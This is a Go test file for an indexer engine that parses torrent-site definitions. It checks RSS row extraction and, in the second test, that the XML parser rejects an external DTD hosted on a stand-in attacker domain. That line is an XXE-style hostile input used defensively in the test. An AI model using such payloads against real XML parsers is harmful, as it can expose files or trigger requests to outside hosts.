package cardigann

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestEngineSearchExtractsBoundedXMLRows(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/xml")
		_, _ = w.Write([]byte(`<?xml version="1.0"?><rss><channel><item><title>Fixture Release</title><link>magnet:?xt=urn:btih:0123456789abcdef0123456789abcdef01234567</link><genre>drama</genre></item></channel></rss>`))
	}))
	defer server.Close()

	definition, err := ParseDefinition([]byte(`
id: xml-fixture
name: XML Fixture
type: public
links: [` + server.URL + `]
caps:
  categorymappings: [{id: 1, cat: Other}]
  modes: {search: [q]}
settings: []
search:
  paths:
    - path: /feed
      response: {type: xml}
  rows: {selector: rss.channel.item}
  fields:
    title: {selector: title}
    download: {selector: link}
    genre: {selector: genre}
`))
	if err != nil {
		t.Fatalf("ParseDefinition: %v", err)
	}
	engine, err := New(definition, Config{BaseURL: server.URL}, server.Client())
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	releases, err := engine.Search(context.Background(), Query{Keywords: "fixture"})
	if err != nil {
		t.Fatalf("Search: %v", err)
	}
	if len(releases) != 1 || releases[0].Title != "Fixture Release" {
		t.Fatalf("releases = %+v", releases)
	}
	if len(releases[0].Attributes) != 1 || releases[0].Attributes[0].Name != "genre" || releases[0].Attributes[0].Value != "drama" {
		t.Fatalf("attributes = %+v", releases[0].Attributes)
	}
}

func TestXMLDefinitionRejectsDTDAndExternalEntity(t *testing.T) {
	_, err := parseXMLDocument([]byte(`<!DOCTYPE rss SYSTEM "https://attacker.invalid/evil.dtd"><rss/>`))
	if err == nil || !strings.Contains(err.Error(), "DTD") {
		t.Fatalf("parseXMLDocument error = %v, want DTD rejection", err)
	}
}
